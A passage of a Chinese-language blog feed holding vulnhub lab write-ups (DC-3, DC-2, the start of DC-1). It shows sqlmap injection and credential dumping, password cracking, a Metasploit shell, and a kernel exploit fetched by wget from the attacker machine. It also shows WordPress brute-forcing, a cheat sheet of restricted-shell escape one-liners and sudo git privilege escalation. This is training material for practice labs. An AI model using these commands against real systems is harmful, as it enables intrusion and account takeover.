src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291144738.png" alt="image-20231129114414702"></p><p>把这个文件复制到本地</p><pre><code>┌──(kali㉿kali)-[~/桌面/joomscan]└─$ cp /usr/share/exploitdb/exploits/php/webapps/42033.txt 42033.py</code></pre><p>查看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291146988.png" alt="image-20231129114600939"></p><p>看来是直接使用sqlmap自动工具进行攻击的 将<code>Using sqlmap</code>部分的ip改为靶机ip  进行sql注入</p><pre><code>python3 sqlmap.py -u &quot;http://192.168.160.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291231967.png" alt="image-20231129123121878"></p><p>扫出来五个数据库</p><pre><code>available databases [5]:[*] information_schema[*] joomladb[*] mysql[*] performance_schema[*] sys</code></pre><p>joomla框架搭建的网站默认数据库是joomladb 那我们接下来开始爆表名</p><pre><code>python3 sqlmap.py -u &quot;http://192.168.160.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</code></pre><p>找到76个表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854266.png" alt="image-20231129163133461"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854658.png" alt="image-20231129163224857"></p><p>找到关键的<code>__users</code>表 看一下表中的字段</p><pre><code>python3 sqlmap.py -u &quot;http://192.168.160.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#39;#__users&#39; --columns -p list[fullordering]</code></pre><p>一共有6个字段</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854987.png" alt="image-20231129164401809"></p><p>查看一下<code>username</code> <code>password</code>d 内容</p><pre><code>python3 sqlmap.py -u &quot;http://192.168.160.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#39;#__users&#39; -C &quot;username,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854691.png" alt="image-20231129164901490"></p><p>尝试爆一下密码</p><pre><code>john --wordlist=password.lst --user=name hash out.txt </code></pre><p>得到<code>snoopy</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854126.png" alt="image-20231129165703984"></p><h3 id="四、登陆网站后台"><a href="#四、登陆网站后台" class="headerlink" title="四、登陆网站后台"></a>四、登陆网站后台</h3><p>使用<code>admin/snoopy</code>成功登陆网站后台</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854248.png" alt="image-20231129170324489"></p><h3 id="五、拿到靶机shell"><a href="#五、拿到靶机shell" class="headerlink" title="五、拿到靶机shell"></a>五、拿到靶机shell</h3><p>回到刚才msf扫漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854591.png" alt="image-20231127231618785"></p><p>发现是一个Joomla 组件字段 SQLi 远程代码执行 就用这个漏洞拿到shell</p><pre><code>use 0set RHOST 192.168.160.153runshell</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854997.png" alt="image-20231129172705660"></p><p>再创建一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p>可以看到是<code>www-data</code>用户 这是一个低权限用户 想要看到root中的内容还是需要提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854345.png" alt="image-20231129172919921"></p><h3 id="六、提权"><a href="#六、提权" class="headerlink" title="六、提权"></a>六、提权</h3><p>有之前DC-1 DC-2的经验 尝试使用suid和git进行提权</p><p>首先找了拥有suid权限的命令</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854044.png" alt="image-20231129173830949"></p><p>然而之前提到的<code>find vim cp</code>的提权命令都没有 再看看能不能git提权</p><p>使用<code>sudo -l</code>看看具有root权限的命令有哪些</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854082.png" alt="image-20231129174006935"></p><p>但是在这个靶场中 我们找不到用户<code>www-data</code>的登陆密码 git提权也没法使用</p><h4 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h4><h5 id="查看靶机的发行版本信息"><a href="#查看靶机的发行版本信息" class="headerlink" title="查看靶机的发行版本信息"></a>查看靶机的发行版本信息</h5><pre><code>cat /etc/*release或lsb_release -a</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854977.png" alt="image-20231129183232534"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854742.png" alt="image-20231129202536052"></p><p>得知是<code>Ubuntu 16.04</code>版本</p><p>还是用searchsploit找漏洞</p><pre><code>searchsploit Ubuntu 16.04</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854709.png" alt="image-20231129183629093"></p><p>这种都是权限升级的漏洞 选择39772.txt来进行提权</p><pre><code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code></pre><p>在最下面找到exp文件下载路径 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854917.png" alt="image-20231129210333215"></p><p>建议是在本地下载下来 能解压的都解压 复制粘贴到攻击机上</p><p>下面开启Apache服务 将文件上传到本地的<code>/var/www/html</code>文件夹下 </p><p><strong>(再看wp的时候 我看说是DC-3没有外网 所以选择通过攻击机下载exp文件 但是我在自己试的时候发现是可以直接从39772.txt文件里面的链接下载的 有明白的大佬可以来找我交流一下)</strong></p><pre><code>systemctl start apache2.servicemv 39772.zip /var/www/html</code></pre><p>将攻击机的文件下载到靶机中</p><pre><code>wget http://192.168.160.150/39772.zip// 注意这个url要是攻击机的ip</code></pre><p>下好之后 进行解压</p><pre><code>unzip 39772.zipcd 39772tar -xvf exploit.tar</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300855431.png" alt="image-20231129211808415"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300855109.png" alt="image-20231129211829335"></p><p>进入<code>/39772/ebpf_mapfd_doubleput_exploit</code>文件夹下运行exp文件即可</p><pre><code>./compile.sh./doubleput</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300855436.png" alt="image-20231129213737033"></p><p>拿到root权限 进入root文件夹 找到flag文件</p><pre><code> __        __   _ _   ____                   _ _ _ _  \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)                                                     Congratulations are in order.  :-)I hope you&#39;ve enjoyed this challenge as I enjoyed making it.If there are any ways that I can improve these little challenges,please let me know.As per usual, comments and complaints can be sent via Twitter to @DCAU7Have a great day!!!!</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300855616.png" alt="image-20231129214027919"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-3拿下</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场记录DC-2</title>
      <link href="/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/"/>
      <url>/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场记录DC-2"><a href="#vulnhub靶场记录DC-2" class="headerlink" title="vulnhub靶场记录DC-2"></a>vulnhub靶场记录DC-2</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.As with the original DC-1, it&#39;s designed with beginners in mind.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.Just like with DC-1, there are five flags including the final flag.And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.In short, the only flag that really counts, is the final flag.For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.I haven&#39;t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一-信息搜集"><a href="#一-信息搜集" class="headerlink" title="一.信息搜集"></a>一.信息搜集</h3><p>由于靶场还是设置的是NAT模式 和我们的渗透机共享ip 我们直接查看渗透机ip 在使用nmap扫靶机ip</p><pre><code>ifconfignmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311282022558.png" alt="image-20231121213511709"></p><p>可以看到靶场ip是<code>192.168.160.152</code></p><p>在扫一波信息</p><pre><code>nmap -A -p- -v 192.168.160.152</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311282022463.png" alt="image-20231121213618660"></p><pre><code>开放了80端口的网站 存在web服务 使用Apache/2.4.10 但是不能重定向到http://dc-2/ 开放了7744端口 存在ssh服务 OpenSSH版本6.7p1</code></pre><h3 id="二、修改hosts文件-进行重定向"><a href="#二、修改hosts文件-进行重定向" class="headerlink" title="二、修改hosts文件 进行重定向"></a>二、修改hosts文件 进行重定向</h3><p>将扫到的<code>http://dc-2</code>的域名和靶机ip添加到攻击机的hosts文件中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311220943123.png" alt="image-20231122094333049"></p><p>访问站点 成功 是个wordpress模版搭建的网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311220943678.png" alt="image-20231122094355470"></p><h3 id="三、flag1"><a href="#三、flag1" class="headerlink" title="三、flag1"></a>三、flag1</h3><p>在站点处找到flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311220944155.png" alt="image-20231122094449035"></p><pre><code>flag1Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just can’t win them all.Log in as one to see the next flag.If you can’t find it, log in as another.</code></pre><h3 id="四、flag2"><a href="#四、flag2" class="headerlink" title="四、flag2"></a>四、flag2</h3><h4 id="使用cewl生成密码字典"><a href="#使用cewl生成密码字典" class="headerlink" title="使用cewl生成密码字典"></a>使用cewl生成密码字典</h4><p>flag1提示我们使用cewl来生成不同于我们常用的字典 由此来爆破网站后台登陆密码</p><p>先学习一波cewl的姿势</p><pre><code>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</code></pre><p>下面是cewl的一些命令参数</p><pre><code>语法：cewl [url] [options]常规参数选项：-h, –help：显示帮助。-k, –keep：保存下载文件。-d &lt;x&gt;, –depth &lt;x&gt;：爬行深度，默认2。-m, –min_world_length：最小长度，默认最小长度为3。-o, –offsite：允许爬虫访问其他站点。-w, –write：将输出结果写入到文件。-u, –ua &lt;agent&gt;：设置user agent。-n, –no-words：不输出字典。–with-numbers：允许单词中存在数字，跟字母一样。-a, –meta：包括元数据。–meta_file file：输出元数据文件。-e, –email：包括email地址。–email_file &lt;file&gt;：输入邮件地址文件。–meta-temp-dir &lt;dir&gt;：exiftool解析文件时使用的临时目录，默认是/temp。-c, –count：显示发现的每个单词的数量。-v, –verbose：verbose。–debug:提取调试信息。认证–auth_type：Digest或者basic认证。–auth_user：用户名认证。–auth_pass：密码认证。代理–proxy_host：代理主机。–proxy_port：代理端口，默认8080。–proxy_username：用户名代理。–proxy_password：密码代理。</code></pre><p>下面是具体的一些用法 就直接以我们这个目标靶机为例了</p><p><strong>默认方法：</strong></p><pre><code>cewl http://dc-2/</code></pre><p>cewl对站点进行爬虫 生成了一系列密码 并输出在屏幕上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221010637.png" alt="image-20231122101042575"></p><p><strong>保存字典文件</strong></p><pre><code>cewl http://dc-2/ -w ~/桌面/dict.txt    </code></pre><p>使用w参数 可以将生成的密码字典进行保存</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221012765.png" alt="image-20231122101247740"></p><p><strong>生成特定长度的字典</strong></p><pre><code>cewl http://dc-2/ -m 9</code></pre><p>可见 cewl对目标网站进行了爬取 并生成了长度至少为9的密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221023392.png" alt="image-20231122102350330"></p><p><strong>从网站中获取email</strong></p><pre><code>cewl http://dc-2/ -e -n使用-n隐藏生成的密码字典 </code></pre><p><strong>计算网站字典中重复单词的数量</strong></p><pre><code>cewl http://dc-2/ -c </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221034778.png" alt="image-20231122103438726"></p><p><strong>增加爬取深度</strong></p><pre><code>cewl http://dc-2/ -d 3 </code></pre><p>爬取深度默认为2  使用-d参数 可以选择合适的参数</p><p><strong>提取调试信息</strong></p><pre><code>cewl http://dc-2/ --debug</code></pre><p>可以查看网站爬取过程中出现的错误和元数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221043921.png" alt="image-20231122104302817"></p><p><strong>verbose模式</strong></p><pre><code>cewl http://dc-2/ -v</code></pre><p>verbose模式可以列出网站的详细数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221047686.png" alt="image-20231122104758631"></p><p><strong>生成包含数字和字符的字典</strong></p><pre><code>cewl http://dc-2/ --with-numbers</code></pre><p><strong>绕过页面登陆限制</strong></p><pre><code>参数：–auth_type:                      Digest or basic–auth_user:                     Authentication username.–auth_pass:                     Authentication password.</code></pre><pre><code>命令：cewl http://localhost:81/DVWA/DVWA/login.php --auth_type basic --auth_user admin --auth_pass password -v或cewl http://localhost:81/DVWA/DVWA/login.php --auth_type Digest --auth_user admin --auth_pass password -v</code></pre><p><strong>代理URL</strong></p><p>如果目标网站设置了代理服务器的话，Cewl将无法使用默认命令来生成字典。此时你需要使用–proxy option选项来启用代理URL功能：</p><pre><code>cewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http://192.168.1.103/wordpress/</code></pre><h4 id="使用wpscan进行爆破"><a href="#使用wpscan进行爆破" class="headerlink" title="使用wpscan进行爆破"></a>使用wpscan进行爆破</h4><p>那我们现在已经成功得到了密码字典 下一步就是找网站登陆用户 使用wpscan对网站进行扫描<font color='red'>(wpscan是针对wordpress模版搭建的网站很常用的漏洞扫描工具)</font></p><p>在学习一波wpscan的姿势</p><pre><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</code></pre><p>下面是常见的命令参数</p><pre><code>语法：wpscan --url [url] -options --url                           要扫描的目标url，允许的协议http、https，默认使用http协议--help                             显示简单的帮助--version                           显示WPScan的版本信息-o                                 输出文件到指定位置-f                                 指定文件输出的格式--user-agent                        使用指定的ua头--random-user-agent             使用随机UA头--max-threads                    最大线程数，默认最大线程为5--proxy                         加载代理--update                        更新漏洞库--force                             不检测目标是否在运行wordpress--api-token                      使用token用于显示漏洞信息--wp-content DIR                自定义指定检测内容--cookie                          指定cookievp                                 结果中显示有漏洞的插件(插件漏洞扫描)vt                               结果中显示存在漏洞的主题(主题漏洞扫描)at                               结果中显示所有主题ap                              结果中显示目标的所有插件tt                                列举缩略图相关的文件--enumerate/-e                    枚举  [option](要枚举的目标)u                               枚举用户名p                                枚举插件(插件扫描)t                                枚举主题(主题扫描)</code></pre><p>进行用户名、主题扫描、插件扫描、插件漏洞扫描、主题漏洞扫描的时候、TimThumbs文件扫描(缩略图相关文件)时 直接使用以下命令</p><pre><code>wpscan --url http://dc-2/ -e u,t,t,vt,vp,tt</code></pre><p>wpscan还可以进行爆破用户名和密码</p><pre><code>wpscan --url http://dc-2/ --wordlist[字典文件] --username[要破解的用户] --threads[开启的线程数]wpscan --url http://dc-2/ -P [密码字典] -U [用户字典]</code></pre><p>下面我们就用wpscan对站点进行扫描 flag1提示我们要爆破用户名和密码 登录之后来找到后面的flag 我们前面用cewl得到了密码字典 在使用wpscan扫一下用户名</p><pre><code>wpscan --url http://dc-2/ -e u</code></pre><p>扫到三个用户名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221148513.png" alt="image-20231122114815466"></p><p>下面创建一个用户名字典 进行爆破</p><pre><code>wpscan --url http://dc-2/ -P dict.txt -U user.txt</code></pre><p>找到了jerry和tom两个用户的密码</p><pre><code>jerry / adipiscing                                                                                           tom / parturient   </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221151221.png" alt="image-20231122115139193"></p><p>尝试使用这两组用户密码登陆站点后台 一般来说 wp模版搭建的网站后台登陆页面在&#x2F;wp-admin中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221153469.png" alt="image-20231122115333428"></p><p>两组任选其一都可以成功登陆</p><p>登陆jerry账号后 在page页找到了flag2</p><pre><code>Flag 2:If you can&#39;t exploit WordPress and take a shortcut, there is another way.Hope you found another entry point.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221303551.png" alt="image-20231122130309492"></p><p>但是登陆tom账号后 什么也没发现</p><h3 id="五、flag3"><a href="#五、flag3" class="headerlink" title="五、flag3"></a>五、flag3</h3><h4 id="ssh连接tom"><a href="#ssh连接tom" class="headerlink" title="ssh连接tom"></a>ssh连接tom</h4><p>flag2提示说 如果在wordpress中找不到突破 那就换个方式  在前期信息搜集的时候 我们扫到了开放了端口为7744的ssh服务 </p><p>现在手上有jerry和tom的账号密码 也不用再用hydra爆破密码了 直接ssh连就完了</p><pre><code>ssh jerry@192.168.160.152 -p 7744ssh tom@192.168.160.152 -p 7744</code></pre><p>发现jerry用户登不上去 tom用户可以登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221617428.png" alt="image-20231122161711383"></p><p>使用ls命令查看当前目录下的文件 找到flag3.txt  但是cat、cd等命令都无法执行 ls命令还可以执行</p><pre><code>ls /home/tom/usr/bin # 查看一下tom账号拥有哪些命令权限</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221638582.png" alt="image-20231122163817548"></p><p>发现less和vi命令都还可以执行 那就可以读取flag3.txt的内容</p><pre><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221639501.png" alt="image-20231122163925464"></p><h3 id="六、flag4"><a href="#六、flag4" class="headerlink" title="六、flag4"></a>六、flag4</h3><p>我们现在连上的bash其实是rbash 是受限的bash</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221642153.png" alt="image-20231122164241125"></p><p>下面来学习一些关于<code>rbash</code>的姿势</p><h4 id="设置rbash"><a href="#设置rbash" class="headerlink" title="设置rbash"></a>设置rbash</h4><pre><code>cp  /bin/bash  /bin/rbash # 复制一个bash 重命名为rbashuseradd -s /bin/rbash tom # 设置用户tom登陆的shell为rbashmkdir -p /home/tom/.bin   # 在tom用户下新建一个.bin目录存放可以执行的命令ln -s  /bin/clear  /home/$tom/.bin/clear  # 设置软链接执行命令编辑文件/home/$tom/.bashrc,添加export PATH=$HOME/.bin/.  文件一定要以# .bashrc为首行.</code></pre><h4 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h4><p><strong>一、枚举linux环境</strong> </p><pre><code>1.检查常见命令 su cd ls cat等2.检查可用的操作符 &lt; &gt; &lt;&lt; &gt;&gt; | / \等3.root身份可以运行的命令sudo -l4.检查shellecho $SHELL5.检查可用的编程语言 python php ruby perl 6.检查环境变量 执行 env/printenv</code></pre><p><strong>二、绕过方式</strong></p><ol><li><p><code>/</code>字符被允许使用</p><p>直接执行</p><pre><code>/bin/bash</code></pre><p>2.<code>cp</code>命令允许执行</p><pre><code>cp /bin/bash test1cp /bin/sh test2./test1  # 切换到了/bin/bash./test2  # 切换到了/bin/bash</code></pre><p>3.常见应用</p><p>ftp&#x2F;gdb(调试程序的工具)</p><pre><code>ftp &gt; !/bin/shgdb &gt; !/bin/sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221706614.png" alt="image-20231122170643581"></p></li></ol><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221707134.png" alt="image-20231122170747090"></p><p>man&#x2F;git </p><pre><code>man &gt; !/bin/shgit &gt; git help status</code></pre><p>vim&#x2F;vi</p><pre><code>vim/vi test:!/bin/sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221716374.png" alt="image-20231122171602341"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221716209.png" alt="image-20231122171612178"></p><p>more&#x2F;less</p><pre><code>more test!/bin/sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221720070.png" alt="image-20231122172043030"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221720198.png" alt="image-20231122172023168"></p><p>4.set shell</p><pre><code># vim/vi创建一个文件 进入之后:set shell=/bin/sh # 或者用/bin/bash:shell # 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin/</code></pre><p>5.更改PATH或SHELL环境变量 </p><pre><code>BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</code></pre><p>6.编程语言</p><p>（1）python</p><pre><code>python -c &quot;import os;os.system(&#39;/bin/bash&#39;)&quot;或者python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p>（2）php</p><pre><code>php -a then exec(&quot;sh -i&quot;)</code></pre><p>（3）perl</p><pre><code>perl -e &quot;exec &#39;/bin/sh&#39;;&quot;</code></pre><p>（4）lua</p><pre><code>os.execute(&#39;/bin/sh&#39;)</code></pre><p>（5）ruby</p><pre><code>exec &quot;/bin/sh&quot;</code></pre><p>7.其他方法</p><p>ssh</p><pre><code>ssh username@IP -t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;</code></pre><p>ssh(2)</p><pre><code>ssh username@IP -t &quot;bash --noprofile&quot;</code></pre><p>ssh(3)</p><pre><code>ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (sehllshock)</code></pre><p>ssh(4)</p><pre><code>ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)</code></pre><p>zip</p><pre><code>zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;</code></pre><p>tar</p><pre><code>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash</code></pre><p>awk(超级玛丽靶机使用它成功了)</p><pre><code>awk &#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39; </code></pre><p>现在绕过rbash的方法基本上就是这些了 现在开始在攻击机中绕过tom账户的rbash权限</p><p>首先，信息搜集 由flag3的部分 我们知道目前可以使用的只有ls vim less scp这些命令可以使用</p><p>在这里 我们使用第4种方法 set shell</p><pre><code>vi:set shell=/bin/sh:shellexport PATH=$PATH:/bin/export PATH=$PATH:/usr/bin/</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221914940.png" alt="image-20231122191437884"></p><p>成功绕过rbash </p><p>在flag3中还提示我们用<code>su</code>来切换用户 现在我们找一下jerry用户 进入jerry 在目录下找到flag4</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221916361.png" alt="image-20231122191628316"></p><pre><code>flag4Good to see that you&#39;ve made it this far - but you&#39;re not home yet. You still need to get the final flag (the only flag that really counts!!!).  No hints here - you&#39;re on your own now.  :-)Go on - git outta here!!!!</code></pre><h3 id="七、thefinalflag"><a href="#七、thefinalflag" class="headerlink" title="七、thefinalflag"></a>七、thefinalflag</h3><h4 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h4><p>flag4告诉我们还有最后一个flag  提到git 可能是让我们使用git进行提权</p><p>首先查看一下jerry用户可以使用的root命令有哪些</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221935131.png" alt="image-20231122193526092"></p><p>发现可以无密码使用git命令 正好切合了提示中的git</p><pre><code>sudo git help config!/bin/sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221947041.png" alt="image-20231122194706813"></p><p>成功提权成功 进入root文件夹 找到<code>final-flag.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221949641.png" alt="image-20231122194905561"></p><pre><code> __    __     _ _       _                    _ / / /\ \ \___| | |   __| | ___  _ __   ___  / \\ \/  \/ / _ \ | |  / _` |/ _ \| &#39;_ \ / _ \/  / \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/   \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   Congratulatons!!!A special thanks to all those who sent me tweetsand provided me with feedback - it&#39;s all greatlyappreciated.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 全部flag都被找到</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场记录DC-1</title>
      <link href="/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/"/>
      <url>/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场记录DC-1"><a href="#vulnhub靶场记录DC-1" class="headerlink" title="vulnhub靶场记录DC-1"></a>vulnhub靶场记录DC-1</h1><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><pre><code>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.There are five flags in total, but the ultimate goal is to find and read the flag in root&#39;s home directory. You don&#39;t even need to be root to do this, however, you will require root privileges.Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</code></pre><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>下载路径</p><pre><code>https://download.vulnhub.com/dc/DC-1.zip</code></pre><p> 使用vmware——文件——打开——导入DC-1.ova——创建靶机</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一-信息搜集-寻找真实ip-探端口及服务"><a href="#一-信息搜集-寻找真实ip-探端口及服务" class="headerlink" title="一.信息搜集(寻找真实ip 探端口及服务)"></a>一.信息搜集(寻找真实ip 探端口及服务)</h3><pre><code>目标探测，如：扫描域名、IP、开放端口、确认其使用的软件版本、框架版本等</code></pre><p>我们只需要创建好靶机就可以了 不需要进行登陆 在渗透过程中 不需要登陆root用户 但是需要root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028518.png" alt="image-20231031191735196"></p><p>由于我们刚刚对于靶机的网络设置是NAT模式  所以靶机是自动获得IP 且和kali是在同一局域网下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028767.png" alt="image-20231031191903572"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028423.png" alt="image-20231031192114585"></p><p>可以看到 我们现在kali的ip是<code>192.168.160.131 </code> 那么我们可以使用nmap扫描kali的c段中存活的主机 来找到靶机的真实ip</p><pre><code>nmap 192.168.160.0/24-sP：向目标发送 TCP ACK 